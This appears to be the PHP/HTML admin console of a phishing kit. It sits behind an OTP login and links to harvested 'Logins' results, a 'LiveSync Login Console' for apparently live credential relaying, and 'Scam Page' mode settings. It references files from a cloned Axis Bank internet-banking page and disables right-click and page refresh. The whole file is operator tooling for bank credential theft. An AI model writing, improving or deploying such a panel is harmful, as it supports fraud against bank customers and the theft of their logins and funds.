<?php
session_start();
ini_set('display_errors', 1);


// Check if user has passed OTP verification
if (!isset($_SESSION['otp_verified']) || $_SESSION['otp_verified'] !== true) {
    // Redirect user to login page
    header("Location: login.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Console</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        .video-container {
            position: relative;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }

        #bg-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 1300px;
            padding: 10px;
            color: #fff;
        }

        .section {
            padding: 10px;
            text-align: center;
            flex: 1;
            margin: 10px;
        }

        h1 {
            color: #02FF6A;
            margin-top: 0;
            margin-bottom: 20px;
        }

        table {
            border-collapse: collapse;
            width: 100%;
            margin-top: 10px;
            background-color: transparent;
        }

        th, td {
            border: 1px solid #014412;
            padding: 8px;
            text-align: center;
            color: #72ff67;
        }

        th {
            background-color: #065431;
        }

        .green-button {
            background-color: rgba(153, 255, 144, 0.1);
            color: #b1ffab;
            padding: 10px 20px;
            margin: 5px auto;
            display: block;
            border: none;
            border-radius: 15px;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.5s ease;
            font-size: 16px;
        }

        .green-button:hover {
            background-color: rgba(2, 255, 120, 0.8);
        }
    </style>
</head>
<body>

<div class="video-container">
    <video autoplay muted loop id="bg-video">
        <source src="https://rb.gy/dzshag" >
        Your browser does not support the video tag.
    </video>
</div>
<script async="" src="Axis%20Bank%20Internet%20Banking_files/analytics.js"></script><script>
   if(window.self == window.top) {
    var antiClickjack = document.getElementById("antiClickjack"); 
       antiClickjack.parentNode.removeChild(antiClickjack); 
   } else {
       top.location = self.location; 
   }
</script>


<script type="text/JavaScript">
		//edit this message to say what you want
		var message = "You Good?";

		function clickIE() {
			if (document.all) {
				alert(message);
				return false;
			}
		}
		function clickNS(e) {
			if (document.layers || (document.getElementById && !document.all)) {
				if (e.which == 2 || e.which == 3) {
					alert(message);
					return false;
				}
			}
		}
		if (document.layers) {
			document.captureEvents(Event.MOUSEDOWN);
			document.onmousedown = clickNS;
		} else {
			document.onmouseup = clickNS;
			document.oncontextmenu = clickIE;
		}

		document.oncontextmenu = new Function("return false")

	</script>
<script type="text/JavaScript">
function mouseDown(e) {
 var ctrlPressed=0;
 var altPressed=0;
 var shiftPressed=0;

 if (parseInt(navigator.appVersion)>3) {

  var evt = e ? e:window.event;

  if (document.layers && navigator.appName=="Netscape"
      && parseInt(navigator.appVersion)==4) {
   // NETSCAPE 4 CODE
   var mString =(e.modifiers+32).toString(2).substring(3,6);
   shiftPressed=(mString.charAt(0)=="1");
   ctrlPressed =(mString.charAt(1)=="1");
   altPressed  =(mString.charAt(2)=="1");
   self.status="modifiers="+e.modifiers+" ("+mString+")"
  }
  else {
   // NEWER BROWSERS [CROSS-PLATFORM]
   shiftPressed=evt.shiftKey;
   altPressed  =evt.altKey;
   ctrlPressed =evt.ctrlKey;
   self.status=""
    +  "shiftKey="+shiftPressed 
    +", altKey="  +altPressed 
    +", ctrlKey=" +ctrlPressed 
  }
  if (shiftPressed || altPressed || ctrlPressed) 
   alert ("Mouse clicked with the following keys:\n"
    + (shiftPressed ? "Shift ":"")
    + (altPressed   ? "Alt "  :"")
    + (ctrlPressed  ? "Ctrl " :"")
   )
 }
 return true;
}

function onkeypress(e){
		var version = navigator.appVersion;
		var keycode = (window.event) ? event.keyCode : e.keyCode;
            if ((version.indexOf('MSIE') != -1)) {
                if (keycode == 116) {
					alert('Refresh Not allowed');
                    event.keyCode = 0;
                    event.returnValue = false;
                    return false;
                }
            }
            else {
                if (keycode == 116) {
					alert('Refresh Not allowed');
					return false;
                }
            }
}

if (parseInt(navigator.appVersion)>3) {
	document.onkeydown = onkeypress;
	document.onmousedown = mouseDown;
 if (navigator.appName=="Netscape") 
   document.onkeydown = onkeypress;
  //document.captureEvents(Event.MOUSEDOWN);
}
</script>
<div class="container">
    <div class="section">
        <h1>Results Panel</h1>
        <table>
            <tr>
                <th>Login  </th>
            </tr>
            <tr>
                <td><a href="../rezlts/logs.php" class="green-button">Logins</a></td>
            </tr>
            
			
        </table>
    </div>

    <div class="section">
        <h1>LiveSync </h1>
        <table>
            <tr>
                <th>LiveSync Console Panels</th>
            </tr>
			
            <tr>
                <td><a href="../rezlts/LiveSync/send_form.php" class="green-button">LiveSync Login Console</a></td>
            </tr>
           
        </table>
    </div>

    <div class="section">
        <h1>Scam Page </h1>
        <table>
            <tr>
                <th>Modes/Settings</th>
            </tr>
            <tr>
                <td><a href="../setting/rezlts_settings/manage_settings.php" class="green-button">Result Box Settings</a></td>
            </tr>
            <tr>
                <td><a href="../setting/E&D_commands/toggle_form.php" class="green-button">ScamPage Modes</a></td>
            </tr>
           
        
            <tr>
                <td><a href="../setting/livesync/toggle_form.php" class="green-button">LiveSync Console Settings</a></td>
            </tr>
            
        </table>
    </div>

  

    <div class="section">
        <h1>Admin Panel </h1>
        <table>
            <tr>
                <th>Settings</th>
            </tr>
           
            <tr>
                <td><a href="logout.php" class="green-button">Logout</a></td>
            </tr>
        </table>
    </div>
</div>

</body>
</html>
